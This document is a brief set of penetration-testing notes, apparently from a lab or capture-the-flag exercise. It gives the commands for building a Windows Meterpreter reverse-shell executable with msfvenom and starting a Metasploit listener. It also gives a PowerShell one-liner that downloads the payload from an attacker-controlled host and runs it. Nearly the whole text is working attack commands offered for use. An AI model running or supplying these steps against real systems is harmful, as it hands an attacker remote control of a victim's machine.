
msfvenom create rev shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.158 LPORT=1337 -f exe -o rev_shell.exe
```

setup listener with msfconsole
```
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 10.10.14.158
lhost => 10.10.14.158
msf exploit(handler) > set lport 1337
lport => 1337
msf exploit(handler) > run
```

Execute rev shell
```
Invoke-WebRequest -Uri "http://10.10.14.158:8000/rev_shell.exe" -OutFile "C:\rev_shell.exe"; Start-Process "C:\rev_shell.exe"
```